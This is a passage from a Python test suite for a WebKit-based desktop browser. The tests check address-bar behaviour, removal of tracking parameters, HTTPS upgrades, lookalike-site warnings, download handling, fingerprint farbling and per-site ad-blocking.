        count = win.notebook.get_n_pages()
        win._on_tab_header_click(win.get_active_tab_box(), ev)
        self.assertEqual(win.notebook.get_n_pages(), count - 1, "middle-click closes the tab")

    # ---- address bar ----------------------------------------------------
    def test_address_bar_follows_single_page_navigation(self):
        win = self.win
        wv = self.load("/spa")
        win.get_active_webview().grab_focus()
        js(wv, "go(1)")
        self.assertTrue(spin(lambda: win.url_entry.get_text().endswith("/spa/watch?v=1"), 5),
                        "address bar shows the page's new address: " + win.url_entry.get_text())

    def test_address_bar_keeps_what_you_type(self):
        win = self.win
        wv = self.load("/spa")
        win.url_entry.grab_focus()
        win.url_entry.set_text("half-typed")
        js(wv, "go(2)")
        spin(lambda: (wv.get_uri() or "").endswith("v=2"), 5)
        self.assertEqual(win.url_entry.get_text(), "half-typed")
        wv.grab_focus()

    def test_address_bar_keeps_what_you_type_when_the_page_finishes_loading(self):
        win = self.win
        wv = self.load("/blank")
        win.url_entry.grab_focus()
        win.url_entry.set_text("half-typed")
        finished = []
        handler = wv.connect("load-changed", lambda v, e: e == WebKit2.LoadEvent.FINISHED and finished.append(1))
        self.addCleanup(wv.disconnect, handler)
        wv.reload()
        self.assertTrue(spin(lambda: finished, 5))
        self.assertEqual(win.url_entry.get_text(), "half-typed")
        wv.grab_focus()

    def test_first_click_in_address_bar_selects_the_address(self):
        win = self.win
        self.load("/blank")
        win.get_active_webview().grab_focus()
        ev = Gdk.EventButton()
        ev.type = Gdk.EventType.BUTTON_PRESS
        ev.button = 1
        self.assertTrue(win.on_url_entry_button_press(win.url_entry, ev), "GTK doesn't move the cursor to the click")
        text = win.url_entry.get_text()
        self.assertTrue(text)
        self.assertEqual(win.url_entry.get_selection_bounds(), (0, len(text)), "typing replaces the whole address")
        win.get_active_webview().grab_focus()

    def test_enter_in_address_bar_hands_focus_to_the_page(self):
        win = self.win
        win.url_entry.grab_focus()
        win.url_entry.set_text(self.base + "/blank")
        win.on_url_activate(win.url_entry)
        spin(lambda: False, 0.2)
        self.assertFalse(win.url_entry.has_focus())

    # ---- HTTPS upgrade + tracking parameters ------------------------------
    def test_typed_address_loses_its_tracking_parameters(self):
        win = self.win
        before = win.stats["params"]
        win.url_entry.set_text(self.base + "/done?utm_source=mail&k=1")
        win.on_url_activate(win.url_entry)
        self.assertTrue(spin(lambda: "/done?k=1" in Handler.requests, 8), Handler.requests)
        self.assertNotIn("/done?utm_source=mail&k=1", Handler.requests, "the site never sees the tracking tag")
        self.assertEqual(win.stats["params"], before + 1)

    def test_tab_opened_by_a_link_loses_its_tracking_parameters(self):
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        opener = self.open_tab("/opener", "opener")._arrow_webview
        count = self.win.notebook.get_n_pages()
        js(opener, "document.getElementById('p').click()")
        self.assertTrue(spin(lambda: "/done?k=1" in Handler.requests, 8), Handler.requests)
        self.assertEqual(self.win.notebook.get_n_pages(), count + 1, "opened in a new tab")
        self.assertNotIn("/done?utm_source=mail&k=1", Handler.requests)

    def test_iframe_in_a_new_tab_is_never_loaded_as_the_page(self):
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        tab = self.open_tab("/framed", "framed")
        self.assertTrue(spin(lambda: Handler.hits.get("/thin", 0) > 0, 5))
        spin(lambda: False, 0.5)
        self.assertEqual(tab._arrow_webview.get_uri(), self.base + "/framed", "the tab still shows its own page")

    def test_http_is_really_upgraded_and_warns_when_https_fails(self):
        # 127.0.0.1 is never upgraded (local network); pretend it's a public site. The test server only
        # speaks plain HTTP, so the upgraded load must fail and show the HTTPS warning.
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        real = bb.is_local_network_host
        bb.is_local_network_host = lambda host: False
        self.addCleanup(setattr, bb, "is_local_network_host", real)
        before = self.win.stats["https"]
        wv = self.win.create_new_tab(self.base + "/blank")
        self.assertTrue((wv.get_uri() or "").startswith("https://"), wv.get_uri())
        self.assertTrue(spin(lambda: "Secure connection unavailable" in (js(wv, "document.body.innerText") or ""), 15))
        self.assertEqual(self.win.stats["https"], before + 1)
        self.assertNotIn("/blank", Handler.requests, "nothing was sent over plain HTTP")

    def test_clicked_link_loses_its_tracking_parameters_before_it_is_sent(self):
        # WebKit sends a clicked link's request before Python hears of it, so the page's own script cleans it.
        win = self.win
        before = win.stats["params"]
        wv = self.load("/menu", "menu")
        js(wv, "document.getElementById('link').click()")
        self.assertTrue(spin(lambda: "/done?k=1" in Handler.requests, 8), Handler.requests)
        self.assertNotIn("/done?utm_source=mail&k=1", Handler.requests, "the site never sees the tracking tag")
        self.assertTrue(spin(lambda: win.stats["params"] == before + 1, 3), "counted for the Privacy Report")
        win.on_clearurls_toggled(False)
        self.addCleanup(win.on_clearurls_toggled, True)
        wv = self.load("/menu", "menu")
        js(wv, "document.getElementById('link').click()")
        self.assertTrue(spin(lambda: "/done?utm_source=mail&k=1" in Handler.requests, 8), "the switch turns it off")

    def test_clicked_plain_http_link_is_upgraded_before_it_is_sent(self):
        win = self.win
        self.assertTrue(spin(lambda: win.https_filter is not None, 5), "HTTPS rules never compiled")
        before = win.stats["https"]
        wv = self.load("/clicklinks", "clicklinks")
        js(wv, "document.getElementById('plain').click()")
        self.assertTrue(spin(lambda: "Secure connection unavailable" in (js(wv, "document.body.innerText") or ""), 15))
        self.assertEqual(wv.get_uri(), "https://arrow-https-test.invalid/page", "upgraded by WebKit, then warned")
        self.assertEqual(win.stats["https"], before + 1)
        self.assertEqual(js(wv, "location.origin"), "null", "the warning isn't that site's page")
        self.addCleanup(win._compile_https_filter)
        self.addCleanup(win._http_allowed_hosts.discard, "arrow-https-test.invalid")
        wv.load_uri(js(wv, "document.querySelector('a.alt').href"))  # "Continue to HTTP"
        self.assertTrue(spin(lambda: (wv.get_uri() or "") == "http://arrow-https-test.invalid/page"
                             and "didn't load" in (js(wv, "document.body.innerText") or ""), 15),
                        f"WebKit upgraded the address again: {wv.get_uri()}")

    def test_clicked_link_to_a_lookalike_bank_is_stopped_before_it_is_sent(self):
        wv = self.load("/clicklinks", "clicklinks")
        js(wv, "document.getElementById('fake').click()")
        self.assertTrue(spin(lambda: "This may be a fake site" in (js(wv, "document.body.innerText") or ""), 8),
                        "a clicked link used to slip past the check (the view still reported the old address)")
        self.assertEqual(wv.get_uri(), "https://hdfc-netbanking.invalid/login")
        self.assertEqual(js(wv, "location.origin"), "null", "nothing from that site can read the one-time token")

    def test_hidden_frame_cannot_save_a_file_the_server_didnt_send_as_a_download(self):
        folder = tempfile.mkdtemp(dir=_HOME)
        self.win.download_dir = folder
        self.addCleanup(setattr, self.win, "download_dir", "")
        before = len(self.win.downloads_history)
        self.load("/blobframe", "blobframe")
        self.assertTrue(spin(lambda: Handler.hits.get("/blob.bin", 0) > 0, 5))
        spin(lambda: False, 1)
        self.assertEqual(len(self.win.downloads_history), before, "a hidden frame started a download")
        self.win.get_active_webview().load_uri(self.base + "/blob.bin")  # opened as the page: saved
        self.assertTrue(spin(lambda: len(self.win.downloads_history) == before + 1, 5))

    def test_typed_file_address_opens_the_file(self):
        path = os.path.join(_HOME, "typed page.html")
        with open(path, "w") as f:
            f.write("<html><title>typed-file</title></html>")
        win = self.win
        win.url_entry.set_text(GLib.filename_to_uri(path))
        win.on_url_activate(win.url_entry)
        wv = win.get_active_webview()
        self.assertTrue(spin(lambda: wv.get_title() == "typed-file", 8), wv.get_uri())

    def test_script_redirect_to_dead_site_shows_error_page_instead_of_retrying_forever(self):
        # After the failed redirect, WebKit's URI goes back to the redirecting page (not empty), which used to
        # reset the retry counter on every attempt: the tab retried forever and the address bar flickered.
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        failures = []
        real = self.win.on_load_failed  # connected when the tab is made, and it stops the signal
        self.win.on_load_failed = lambda *args: failures.append(args[2]) or real(*args)
        self.addCleanup(delattr, self.win, "on_load_failed")
        wv = self.win.create_new_tab(self.base + "/jsredirect-dead")
        self.assertTrue(spin(lambda: "didn't load" in (js(wv, "document.body.innerText") or ""), 10),
                        f"no error page after {len(failures)} failed loads")
        self.assertEqual(wv.get_uri(), f"http://127.0.0.1:{DEAD_PORT}/gone", "the address shows where it failed")
        spin(lambda: False, 2 * self.win.LOAD_RETRY_DELAY_MS / 1000)
        self.assertLessEqual(len(failures), 1 + self.win.MAX_AUTO_RETRY_LOAD_FAILURES, "kept retrying")

    def test_failed_load_retry_gives_way_to_the_users_next_page(self):
        # A load that fails after committing (the connection drops mid-page) still ends with FINISHED. That used to
        # reset the retry count, so the tab retried every 600 ms forever; and the retry fired even after the user
        # had gone somewhere else, dragging the tab back to the failing address.
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        wv = self.win.create_new_tab(self.base + "/blank")
        self.assertTrue(spin(lambda: not wv.is_loading(), 10))
        dead = f"http://127.0.0.1:{DEAD_PORT}/gone"
        error = GLib.Error.new_literal(WebKit2.network_error_quark(), "Connection reset by peer",
                                       int(WebKit2.NetworkError.FAILED))
        wv._arrow_committed = True
        self.win.on_load_failed(wv, WebKit2.LoadEvent.COMMITTED, dead, error)
        self.win.on_load_changed(wv, WebKit2.LoadEvent.FINISHED)
        self.assertEqual(self.win._load_failure_counts.get(id(wv)), 1, "FINISHED of a failed load reset the count")
        wv.load_uri(self.base + "/blank?next")
        self.assertTrue(spin(lambda: (wv.get_uri() or "").endswith("?next") and not wv.is_loading(), 10))
        spin(lambda: False, 2 * self.win.LOAD_RETRY_DELAY_MS / 1000)
        self.assertTrue((wv.get_uri() or "").endswith("?next"), f"the retry took the tab back to {wv.get_uri()}")

    def test_page_that_crashes_after_loading_is_not_reloaded_forever(self):
        # Every finished reload used to reset the crash count, so the "keeps crashing" page never came.
        self.addCleanup(self.close_new_tabs, self.win._tab_boxes())
        wv = self.win.create_new_tab(self.base + "/blank")
        self.assertTrue(spin(lambda: not wv.is_loading(), 10))
        for _ in range(self.win.MAX_AUTO_RELOAD_CRASHES + 1):
            self.win.on_web_process_terminated(wv, WebKit2.WebProcessTerminationReason.CRASHED)
            spin(lambda: wv.is_loading(), 2)
            self.assertTrue(spin(lambda: not wv.is_loading(), 10))
        self.assertTrue(spin(lambda: "keeps crashing" in (js(wv, "document.body.innerText") or ""), 5),
                        "still reloading after repeated crashes")

    def test_closed_window_stops_its_background_checks(self):
        private = bb.ArrowBrowserWindow(private=True)
        private.destroy()
        self.assertTrue(spin(lambda: private._window_released, 5))
        self.assertFalse(private._check_tab_suspension(), "the tab-sleep check kept running")
        self.assertFalse(private._check_memory_pressure(), "the memory check kept running")
        self.assertIsNone(getattr(private, "_memory_warning_handler", None), "still listening for low memory")
        self.assertTrue(self.win._check_memory_pressure(), "the open window's check carries on")

    def test_touchpad_ctrl_scroll_zooms_one_step_per_whole_unit(self):
        wv = self.win.get_active_webview()
        self.win.adjust_zoom(reset=True)
        self.addCleanup(self.win.adjust_zoom, reset=True)

        def scroll(delta_y):
            event = Gdk.Event.new(Gdk.EventType.SCROLL)
            event.scroll.direction = Gdk.ScrollDirection.SMOOTH
            event.scroll.delta_y = delta_y
            event.scroll.state = Gdk.ModifierType.CONTROL_MASK
            self.assertTrue(self.win.on_webview_scroll(wv, event))

        for _ in range(4):
            scroll(0.2)  # a touchpad sends many small steps
        self.assertAlmostEqual(wv.get_zoom_level(), 1.0, msg="zoomed before a whole wheel step added up")
        scroll(0.2)
        self.assertAlmostEqual(wv.get_zoom_level(), 0.9, places=2)
        scroll(-1.0)  # a mouse wheel notch the other way
        self.assertAlmostEqual(wv.get_zoom_level(), 1.0, places=2)

    def test_mouse_wheel_scrolls_a_page_that_turns_off_overscroll(self):
        before = self.win._tab_boxes()
        self.addCleanup(self.close_new_tabs, before)
        wv = self.open_tab("/nobounce", "nobounce")._arrow_webview
        self.assertTrue(spin(lambda: wv.get_mapped() and wv.get_allocated_height() > 100, 5))
        pointer = Gdk.Display.get_default().get_default_seat().get_pointer()
        for _ in range(5):
            event = Gdk.Event.new(Gdk.EventType.SCROLL)
            event.scroll.window = wv.get_window()
            event.scroll.send_event = 1
            event.scroll.x, event.scroll.y = wv.get_allocated_width() / 2, wv.get_allocated_height() / 2
            event.scroll.direction = Gdk.ScrollDirection.DOWN  # mouse wheel notches
            event.set_device(pointer)
            wv.event(event)
            spin(lambda: False, 0.2)
        self.assertTrue(spin(lambda: float(js(wv, "window.scrollY") or 0) > 0, 3), "the wheel didn't scroll the page")

    def test_address_bar_dns_lookup_only_for_what_the_user_types(self):
        self.win.url_entry.set_text("example-not-typed.com")
        self.assertIsNone(self.win._dns_typing_source, "the browser's own address change scheduled a DNS lookup")

    # ---- downloads ------------------------------------------------------
    def start_download(self, path):
        count = len(self.win.downloads_history)
        self.win.context.download_uri(self.base + path)
        self.assertTrue(spin(lambda: len(self.win.downloads_history) > count, 5), "download never started")
        return self.win.downloads_history[-1]

    def test_download_uses_the_servers_file_name(self):
        folder = tempfile.mkdtemp(dir=_HOME)
        self.win.download_dir = folder
        self.addCleanup(setattr, self.win, "download_dir", "")
        entry = self.start_download("/dl?id=7")
        self.assertTrue(spin(lambda: entry["status"] != "Downloading...", 10), entry)
        self.assertEqual(entry["status"], "Completed ✅")
        self.assertIn(entry["filename"], ("Report 2026.pdf", "Report_2026.pdf"))  # WebKit may swap spaces for _
        with open(os.path.join(folder, entry["filename"]), "rb") as f:
            self.assertEqual(f.read(), b"%PDF-1.4 test")
        second = self.start_download("/dl?id=7")
        self.assertTrue(spin(lambda: second["status"] != "Downloading...", 10))
        self.assertNotEqual(second["path"], entry["path"], "an existing file is never overwritten")

    def test_finished_download_turns_the_button_orange_and_notifies(self):
        folder = tempfile.mkdtemp(dir=_HOME)
        self.win.download_dir = folder
        self.addCleanup(setattr, self.win, "download_dir", "")
        button = self.win.btn_downloads.get_style_context()
        self.win._clear_download_done()
        del self.notifications[:]
        self.assertFalse(self.win.btn_downloads.get_visible(), "hidden while there's nothing to download")
        entry = self.start_download("/dl?id=7")
        self.assertTrue(self.win.btn_downloads.get_visible(), "appears when a download starts")
        self.assertTrue(self.win.btn_downloads.get_image().get_visible(), "with its icon")
        self.assertTrue(spin(lambda: entry["status"] != "Downloading...", 10), entry)
        self.assertTrue(self.win.btn_downloads.get_visible(), "stays up until the finished file is looked at")
        self.assertTrue(button.has_class("download-done"))
        spin(lambda: False, 0.3)  # GTK restyles on the next frame
        colour = button.get_color(button.get_state())
        orange = lambda c: c.red > 0.85 and 0.3 < c.green < 0.5 and c.blue < 0.15  # noqa: E731
        self.assertTrue(orange(colour), colour.to_string())
        bb.apply_ui_theme("light")  # the light theme's own colours sit above the dark ones
        try:
            spin(lambda: False, 0.3)
            colour = button.get_color(button.get_state())
            self.assertTrue(orange(colour), "light theme: " + colour.to_string())
        finally:
            bb.apply_ui_theme(self.win.ui_theme)
        self.assertIn("download complete", self.win.btn_downloads.get_tooltip_text())
        self.assertEqual([n[:2] for n in self.notifications], [("Download complete", entry["filename"])])
        # clicking the notification opens the Downloads window, which puts the button back
        self.notifications[0][2]()
        dialog = self.win._downloads_window
        self.assertIsNotNone(dialog)
        self.addCleanup(dialog.destroy)
        self.assertFalse(button.has_class("download-done"))
        self.assertFalse(self.win.btn_downloads.get_visible(), "goes away once the files have been seen")
        self.assertEqual(self.win.btn_downloads.get_tooltip_text(), "Downloads Manager")
        # while the window is open the finished file is already on show: notify, but no orange
        second = self.start_download("/dl?id=7")
        self.assertTrue(spin(lambda: second["status"] != "Downloading...", 10), second)
        self.assertFalse(button.has_class("download-done"))
        self.assertFalse(self.win.btn_downloads.get_visible())
        self.assertEqual(len(self.notifications), 2)

    def test_downloads_button_stays_up_for_a_failed_or_running_download(self):
        self.win.download_dir = tempfile.mkdtemp(dir=_HOME)
        self.addCleanup(setattr, self.win, "download_dir", "")
        self.win._clear_download_done()
        entry = self.start_download("/broken.zip")
        self.assertTrue(spin(lambda: entry["status"] == "Failed ❌", 10), entry)
        self.assertTrue(self.win.btn_downloads.get_visible(), "a failure isn't hidden away")
        self.assertFalse(self.win.btn_downloads.get_style_context().has_class("download-done"), "orange means done")
        self.win.on_downloads_clicked(None).destroy()
        self.assertFalse(self.win.btn_downloads.get_visible())
        # a download still running when the window is opened keeps the button
        running, _folder = self.slow_download("/big.dat")
        self.addCleanup(lambda: self.win.cancel_download(running))
        self.win.on_downloads_clicked(None).destroy()
        self.assertTrue(self.win.btn_downloads.get_visible())
        self.win.cancel_download(running)
        self.assertFalse(self.win.btn_downloads.get_visible())

    def test_risky_download_is_confirmed_first(self):
        folder = tempfile.mkdtemp(dir=_HOME)
        self.win.download_dir = folder
        self.addCleanup(setattr, self.win, "download_dir", "")
        original = self.win._confirm_risky_download
        self.addCleanup(setattr, self.win, "_confirm_risky_download", original)
        asked = []
        self.win._confirm_risky_download = lambda name, source: asked.append(name) or False
        entry = self.start_download("/invoice.pdf.desktop")
        self.assertTrue(spin(lambda: entry["status"] != "Downloading...", 10), entry)
        self.assertEqual(entry["status"], "Cancelled")
        self.assertEqual(asked, ["invoice.pdf.desktop"])
        self.assertEqual(os.listdir(folder), [], "nothing saved when the user says no")
        self.win._confirm_risky_download = lambda name, source: True
        entry = self.start_download("/invoice.pdf.desktop")
        self.assertTrue(spin(lambda: entry["status"] != "Downloading...", 10), entry)
        self.assertEqual(entry["status"], "Completed ✅")

    def test_failed_download_stays_failed(self):
        self.win.download_dir = tempfile.mkdtemp(dir=_HOME)
        self.addCleanup(setattr, self.win, "download_dir", "")
        entry = self.start_download("/broken.zip")
        self.assertTrue(spin(lambda: entry["status"] != "Downloading...", 10), entry)
        spin(lambda: False, 0.5)
        self.assertEqual(entry["status"], "Failed ❌", "a cut-off download is not reported as completed")
        cancelled = {"filename": "x", "path": "", "status": "Downloading..."}
        self.win.on_download_failed(cancelled, "cancelled")
        self.win.on_download_finished(cancelled)  # WebKit emits "finished" after "failed"
        self.assertEqual(cancelled["status"], "Failed ❌")

    def slow_download(self, path):
        folder = tempfile.mkdtemp(dir=_HOME)
        self.win.download_dir = folder
        self.addCleanup(setattr, self.win, "download_dir", "")
        Handler.download_delay = 0.03
        self.addCleanup(setattr, Handler, "download_delay", 0.01)
        Handler.download_requests.clear()
        entry = self.start_download(path)
        self.assertTrue(spin(lambda: entry["received"] > 100_000, 10), entry)
        return entry, folder

    def test_download_pauses_and_resumes_where_it_stopped(self):
        wv = self.load("/blank", "blank")
        js(wv, "document.cookie = 'sid=abc123; path=/'")
        entry, folder = self.slow_download("/big.dat")
        self.assertTrue(entry["resumable"])
        self.assertTrue(self.win.pause_download(entry))
        self.assertEqual(entry["status"], "Paused")
        part = entry["path"] + bb.DOWNLOAD_PART_SUFFIX
        spin(lambda: False, 0.5)
        kept = os.path.getsize(part)
        self.assertGreater(kept, 100_000)
        self.assertLess(kept, len(BIG_FILE))
        self.assertEqual(sorted(os.listdir(folder)), ["big.dat.part"], "WebKit's own copy is gone; ours stays")
        spin(lambda: False, 0.5)
        self.assertEqual(entry["status"], "Paused", "a pause isn't reported as a failure")

        Handler.download_delay = 0.003
        self.assertTrue(self.win.resume_download(entry))
        self.assertTrue(spin(lambda: entry["status"] != "Downloading...", 15), entry)
        self.assertEqual(entry["status"], "Completed ✅", entry)
        with open(entry["path"], "rb") as f:
            self.assertTrue(f.read() == BIG_FILE, "the resumed file is exactly the original")
        self.assertFalse(os.path.exists(part))
        path, wanted, cookie = Handler.download_requests[-1]
        self.assertEqual(wanted, f"bytes={kept}-", "only the missing part was asked for")
        self.assertIn("sid=abc123", cookie or "", "the site's cookies go with the resumed request")

    def test_download_restarts_when_the_server_cant_resume(self):
        entry, folder = self.slow_download("/norange.dat")
        self.assertTrue(self.win.pause_download(entry))
        Handler.download_delay = 0.003
        self.assertTrue(self.win.resume_download(entry))
        self.assertTrue(spin(lambda: entry["status"] != "Downloading...", 15), entry)
        self.assertEqual(entry["status"], "Completed ✅", entry)
        self.assertIn("started again", entry["note"])
        with open(entry["path"], "rb") as f:
            self.assertTrue(f.read() == BIG_FILE)
        self.assertEqual(os.listdir(folder), ["norange.dat"])

    def test_paused_download_can_be_cancelled(self):
        entry, folder = self.slow_download("/big.dat")
        self.assertTrue(self.win.pause_download(entry))
        self.assertTrue(self.win.cancel_download(entry))
        self.assertEqual(entry["status"], "Cancelled")
        spin(lambda: False, 0.3)
        self.assertEqual(os.listdir(folder), [], "nothing left behind")
        self.assertFalse(self.win.resume_download(entry))

    def test_cut_off_download_is_kept_aside_for_resume(self):
        self.win.download_dir = folder = tempfile.mkdtemp(dir=_HOME)
        self.addCleanup(setattr, self.win, "download_dir", "")
        entry = self.start_download("/broken.zip")
        self.assertTrue(spin(lambda: entry["status"] != "Downloading...", 10), entry)
        self.assertEqual(entry["status"], "Failed ❌")
        self.assertEqual(os.listdir(folder), ["broken.zip.part"], "the cut-off file doesn't pass for the whole one")

    def test_downloads_window_is_live(self):
        entry, folder = self.slow_download("/big.dat")
        self.addCleanup(lambda: self.win.cancel_download(entry))
        dialog = self.win.on_downloads_clicked(None)
        try:
            self.assertFalse(dialog.get_modal(), "browsing goes on while it's open")
            self.assertIs(self.win.on_downloads_clicked(None), dialog, "opening it again brings it forward")

            def texts():
                found = []
                def walk(w):
                    if isinstance(w, (Gtk.Label, Gtk.Button)) and not isinstance(w, Gtk.Container) or isinstance(w, Gtk.Label):
                        found.append(w.get_text())
                    elif isinstance(w, Gtk.Button):
                        found.append(w.get_label())
                    for c in (w.get_children() if isinstance(w, Gtk.Container) else ()):
                        walk(c)
                walk(dialog)
                return found
            self.assertIn("⏸ Pause", texts())
            first = entry["received"]
            self.assertTrue(spin(lambda: any(" of 1.0 MB" in t and "/s" in t for t in texts()), 5), texts())
            self.assertGreater(entry["received"], first)
            self.win.pause_download(entry)
            self.assertTrue(spin(lambda: "▶ Resume" in texts(), 2), texts())
        finally:
            dialog.destroy()
        self.assertIsNone(self.win._downloads_window)

    # ---- links from other apps ---------------------------------------------
    def test_links_passed_at_startup_open_as_tabs(self):
        win = bb.ArrowBrowserWindow(private=True, startup_urls=[self.base + "/done", self.base + "/thin"])
        try:
            uris = [tb._arrow_webview.get_uri() for tb in win._tab_boxes()]
            self.assertEqual(uris, [self.base + "/done", self.base + "/thin"], "no extra homepage tab")
            self.assertEqual(win.get_active_webview().get_uri(), self.base + "/thin")
        finally:
            win.destroy()

    # ---- per-site policy ------------------------------------------------
    def test_per_site_javascript(self):
        wv = self.load("/js", wait_title="js-ran")
        self.assertEqual(wv.get_title(), "js-ran")
        bb.set_site_value(self.win.site_settings, "127.0.0.1", "javascript", False)
        wv = self.load("/js", wait_title="js-off")
        self.assertEqual(wv.get_title(), "js-off", "JavaScript is off for this site")
        self.win.site_settings.clear()
        wv = self.load("/js", wait_title="js-ran")
        self.assertEqual(wv.get_title(), "js-ran", "and back on again")

    def test_canvas_and_audio_reads_are_farbled_consistently(self):
        wv = self.load("/blank")
        result = js(wv, """(function(){
          function draw(){ var c=document.createElement('canvas'); c.width=200; c.height=50;
            var x=c.getContext('2d'); x.fillStyle='#336699'; x.fillRect(0,0,200,50); return c; }
          var a=draw(), b=draw(), d=a.getContext('2d').getImageData(0,0,200,50).data, changed=0;
          for (var i=0;i<d.length;i+=4) if (d[i]!==0x33||d[i+1]!==0x66||d[i+2]!==0x99) changed++;
          var own=a.getContext('2d'), tiny=own.getImageData(0,0,4,4).data, exact=true;
          for (var i=0;i<tiny.length;i+=4) exact = exact && tiny[i]===0x33 && tiny[i+2]===0x99;
          var ctx=new OfflineAudioContext(1,1000,44100), buf=ctx.createBuffer(1,1000,44100);
          buf.copyToChannel(new Float32Array(1000).fill(0.5),0);
          var s1=Array.from(buf.getChannelData(0)), s2=Array.from(buf.getChannelData(0));
          return JSON.stringify({changed:changed, sameURL:a.toDataURL()===b.toDataURL(),
            tinyExact:exact, audioChanged:s1.filter(v=>v!==0.5).length, audioStable:JSON.stringify(s1)===JSON.stringify(s2)});
        })()""")
        self.assertTrue(result.startswith("{"), result)
        r = json.loads(result)
        self.assertTrue(1 <= r["changed"] <= 64, r)
        self.assertTrue(r["sameURL"], "the same drawing gives the same result all session")
        self.assertTrue(r["tinyExact"], "colour-picker sized reads stay exact")
        self.assertTrue(r["audioChanged"] > 0 and r["audioStable"], r)
        # the page's own canvas isn't changed by toDataURL
        self.assertEqual(js(wv, """(function(){var c=document.createElement('canvas');c.width=20;c.height=20;
          var x=c.getContext('2d');x.fillStyle='#ff0000';x.fillRect(0,0,20,20);c.toDataURL();
          x.globalCompositeOperation='copy';var d=x.getImageData(0,0,2,2).data;return d[0]+','+d[1];})()"""), "255,0")

    def test_link_clicks_send_no_ping_and_pages_see_global_privacy_control(self):
        # In a tab of its own: the main tab is left alone (a later GPU-off pop-up test can otherwise freeze it).
        before = self.win._tab_boxes()
        try:
            wv = self.open_tab("/pinglink", "pinglink")._arrow_webview
            self.assertEqual(js(wv, "String(navigator.globalPrivacyControl)"), "true")
            self.assertEqual(js(wv, "String(document.getElementById('f').contentWindow.navigator.globalPrivacyControl)"),
                             "true", "frames get it too")
            self.assertEqual(js(wv, "String(Object.keys(Navigator.prototype).includes('globalPrivacyControl'))"), "true")
            js(wv, "document.getElementById('l').click()")
            self.assertTrue(spin(lambda: (wv.get_uri() or "").endswith("/thin") and not wv.is_loading(), 5))
            spin(lambda: False, 0.5)  # give a ping time to arrive
            self.assertNotIn("POST /pinged", Handler.requests)
            js(wv, "navigator.sendBeacon('/beacon', 'x')")
            self.assertTrue(spin(lambda: "POST /beacon" in Handler.requests, 3), "only <a ping> is blocked, not beacons")
        finally:
            self.close_new_tabs(before)

    def test_farbling_exemptions_match_whole_domains(self):
        wv = self.load("/blank")
        cases = {
            ("challenges.cloudflare.com", "/cdn-cgi/challenge-platform/h/b/turnstile/if/ov2/av0/rcv0/0/x"): True,
            ("www.google.com", "/recaptcha/api2/anchor"): True,
            ("www.google.com", "/recaptcha/enterprise/anchor"): True,
            ("www.recaptcha.net", "/recaptcha/api2/bframe"): True,
            ("newassets.hcaptcha.com", "/captcha/v1/abc/static/hcaptcha.html"): True,
            ("client-api.arkoselabs.com", "/fc/gc/"): True,
            ("WWW.YouTube.com", "/watch"): True,
            ("www.google.com", "/search"): False,      # the rest of Google stays farbled
            ("cloudflare.com", "/"): False,
            ("notyoutube.com", "/"): False,            # look-alike names don't get the exemption
            ("hcaptcha.com.evil.example", "/"): False,
            ("example.com", "/recaptcha/"): False,
        }
        got = json.loads(js(wv, "JSON.stringify(%s.map(([h, p]) => %s(h, p)))"
                            % (json.dumps([list(k) for k in cases]), bb.FARBLING_EXEMPT_JS)))
        self.assertEqual(dict(zip(cases, got)), cases)

    def test_per_site_ad_blocking(self):
        self.load("/third")
        spin(lambda: False, 1.0)
        self.assertEqual(Handler.hits.get("/pixel", 0), 0, "tracker-list rule blocks the third-party load")
        bb.set_site_value(self.win.site_settings, "127.0.0.1", "adblock", False)
        self.load("/third")
        self.assertTrue(spin(lambda: Handler.hits.get("/pixel", 0) > 0, 5), "ad blocking off for this site lets it load")

    def test_path_rules_block_subresources_natively(self):
        self.load("/pathrules")
        spin(lambda: Handler.hits.get("/fine/ok.png", 0) > 0 and Handler.hits.get("/roads/ok.png", 0) > 0, 5)
        spin(lambda: False, 1.0)
        for blocked in ("/pagead/p.png", "/sub/ads/p.png", "/telemetry.png"):
            self.assertEqual(Handler.hits.get(blocked, 0), 0, f"{blocked} is blocked by the native path rules")
        for allowed in ("/roads/ok.png", "/adsense.png", "/fine/ok.png"):
            self.assertGreater(Handler.hits.get(allowed, 0), 0, f"{allowed} must not be caught by '/ads/' or '/adserver/'")
        self.assertGreater(Handler.hits.get("/pagead/stream.m3u8", 0), 0, "streaming manifests are exempt")
        # navigating to a page whose address contains /ads/ is never blocked
        self.assertEqual(self.load("/ads/landing", wait_title="landing").get_title(), "landing")
        # and the per-site ad-block switch turns the path rules off too
        bb.set_site_value(self.win.site_settings, "127.0.0.1", "adblock", False)
        self.addCleanup(self.win.site_settings.clear)
        self.load("/pathrules")
        self.assertTrue(spin(lambda: Handler.hits.get("/pagead/p.png", 0) > 0, 5), "ad blocking off lets /pagead/ load")

    def padlock_blocked_text(self):
        got = []
        self.win.count_blocked_on_page(self.win.get_active_webview(), "127.0.0.1", got.append)
        self.assertTrue(spin(lambda: got and not got[-1].endswith("…"), 5), got)
        return got[-1]

    def test_padlock_counts_what_was_blocked_on_the_page(self):
        self.load("/pathrules")
        spin(lambda: Handler.hits.get("/fine/ok.png", 0) > 0, 5)
        spin(lambda: False, 0.5)
        # three path-rule blocks; the .m3u8 also fails (it isn't a picture) but wasn't blocked
        text = self.padlock_blocked_text()
        self.assertIn("Blocked on this page: 3</b> ads and trackers", text)
        self.assertIn("127.0.0.1 ×3", text)
        self.load("/third")  # a third-party load from a downloaded-list domain
        spin(lambda: False, 0.5)
        text = self.padlock_blocked_text()
        self.assertIn("Blocked on this page: 1</b> ad or tracker", text)
        self.assertIn("localhost", text)
        self.load("/thin")
        self.assertEqual(self.padlock_blocked_text(), "🛡️ Nothing on this page needed blocking.")
        bb.set_site_value(self.win.site_settings, "127.0.0.1", "adblock", False)
        self.assertEqual(self.padlock_blocked_text(), "🛡️ Ad and tracker blocking is off for this site.")

    def test_notification_requests_can_be_blocked_for_every_site(self):
        win = self.win
        self.addCleanup(setattr, win, "block_notification_requests", False)
        win.block_notification_requests = True
        wv = self.load("/thin", "thin")
        js(wv, "window.perm = 'waiting'; Notification.requestPermission().then(p => { window.perm = p }); 1")
        self.assertTrue(spin(lambda: js(wv, "window.perm") != "waiting", 5), "no prompt: answered at once")
        self.assertEqual(js(wv, "window.perm"), "denied")
        # a site allowed before keeps its permission
        bb.set_site_value(win.site_settings, "127.0.0.1", "permissions", "allow", sub="notifications")
        wv = self.load("/blank", "blank")
